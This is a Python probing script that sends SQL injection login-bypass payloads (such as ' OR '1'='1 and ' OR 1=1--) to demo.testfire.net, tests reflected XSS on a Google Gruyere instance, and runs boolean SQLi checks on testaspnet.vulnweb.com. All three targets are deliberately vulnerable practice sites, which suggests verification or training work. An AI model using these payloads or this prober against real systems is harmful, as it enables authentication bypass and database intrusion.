#!/usr/bin/env python3
"""IV-13 Phase 8: cross-target final probes.
(A) testfire doLogin FLAP re-check (S1 string-quote vs N1 numeric-comment vs N5 false-control)
    — same payloads as calibration, ~40 min later, to document window stability.
(B) gruyere reflected XSS via snippets.gtl?uid= (classic surface).
(C) testaspnet Comments.aspx / ReadNews.aspx id-param SQLi booleans.
stdlib only."""
import json, os, re, time, ssl, urllib.request, urllib.parse, urllib.error
from datetime import datetime, timezone, timedelta

UA = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 IV13-IndependentVerifier/1.0'
CTXU = ssl._create_unverified_context()
OUT = '/home/z/my-project/scripts/iv_out'
TZ = timezone(timedelta(hours=2))

class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None

def fetch(url, data=None, use_ssl_unverified=False, timeout=25):
    hdrs = {'User-Agent': UA, 'Accept': 'text/html,*/*;q=0.8'}
    if data is not None:
        hdrs['Content-Type'] = 'application/x-www-form-urlencoded'
        data = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(url, data=data, headers=hdrs,
                                 method='POST' if data is not None else 'GET')
    h = [NoRedirect()]
    if use_ssl_unverified:
        h.append(urllib.request.HTTPSHandler(context=CTXU))
    op = urllib.request.build_opener(*h)
    try:
        r = op.open(req, timeout=timeout)
        return r.status, r.headers.get('Location'), r.read().decode('utf-8', 'replace')
    except urllib.error.HTTPError as e:
        return e.code, e.headers.get('Location'), e.read().decode('utf-8', 'replace')
    except Exception as e:
        return None, None, repr(e)[:120]

results = {'ts': datetime.now(TZ).isoformat(timespec='seconds')}

print('--- (A) testfire flap re-check ---')
TF = 'http://demo.testfire.net'
results['testfire_recheck'] = []
for fam, uid in [('S1-str-quote', "' OR '1'='1"), ('S5-str+comment', "' OR '1'='1'-- "),
                 ('N1-num+comment', "' OR 1=1--"), ('N5-false-control', "' OR 1=2--")]:
    st, loc, body = fetch(TF + '/doLogin', data={'uid': uid, 'passw': 'x'})
    verdict = 'BYPASS' if loc and 'main.jsp' in loc else 'rejected'
    results['testfire_recheck'].append({'family': fam, 'uid': uid, 'status': st,
                                        'location': loc, 'verdict': verdict})
    print('%-16s %s %-28s %s' % (fam, st, loc, verdict), flush=True)
    time.sleep(0.7)

print('--- (B) gruyere reflected XSS snippets.gtl?uid= ---')
INST = '399537805906358592369366415027868878530'
GR = 'https://google-gruyere.appspot.com/' + INST
results['gruyere_refl'] = []
for payload, label in [('<u>iv13rm</u>', 'tag'), ('iv13plain', 'plain')]:
    st, loc, body = fetch(GR + '/snippets.gtl?' + urllib.parse.urlencode({'uid': payload}))
    raw = payload in body if isinstance(body, str) else False
    esc = payload.replace('<', '&lt;') in body if isinstance(body, str) and '<' in payload else False
    i = body.find('iv13') if isinstance(body, str) else -1
    ctx = body[max(0, i - 70):i + 100].replace('\n', ' ') if i >= 0 else ''
    results['gruyere_refl'].append({'label': label, 'status': st, 'raw': raw, 'escaped': esc,
                                    'context': ctx[:220]})
    print('%-8s %s raw=%s esc=%s ctx=%s' % (label, st, raw, esc, ctx[:110]), flush=True)
    time.sleep(0.5)

print('--- (C) testaspnet id-param SQLi booleans ---')
AN = 'http://testaspnet.vulnweb.com'
results['aspnet_id'] = []
for path, q, label in [('/Comments.aspx', 'id=0', 'comments-base'),
                       ('/Comments.aspx', 'id=0%27', 'comments-quote'),
                       ('/Comments.aspx', 'id=0+AND+1%3D1', 'comments-true'),
                       ('/Comments.aspx', 'id=0+AND+1%3D2', 'comments-false'),
                       ('/ReadNews.aspx', 'id=0', 'readnews-base'),
                       ('/ReadNews.aspx', 'id=0%27', 'readnews-quote'),
                       ('/ReadNews.aspx', 'id=0+AND+1%3D1', 'readnews-true'),
                       ('/ReadNews.aspx', 'id=0+AND+1%3D2', 'readnews-false')]:
    st, loc, body = fetch(AN + path + '?' + q)
    err = None
    if isinstance(body, str):
        m = re.search(r'(SQL|syntax|ODBC|OLE DB|exception|error \'800)[^<\n]{0,100}', body, re.I)
        if m:
            err = m.group(0)[:140]
    results['aspnet_id'].append({'label': label, 'status': st,
                                 'len': len(body) if isinstance(body, str) else 0, 'err': err})
    print('%-16s %s len=%-6d err=%s' % (label, st, len(body) if isinstance(body, str) else 0,
                                        (err or '')[:60]), flush=True)
    time.sleep(0.5)

with open(os.path.join(OUT, 'final_probes.json'), 'w') as f:
    json.dump(results, f, indent=1, ensure_ascii=False)
print('\nsaved -> scripts/iv_out/final_probes.json')
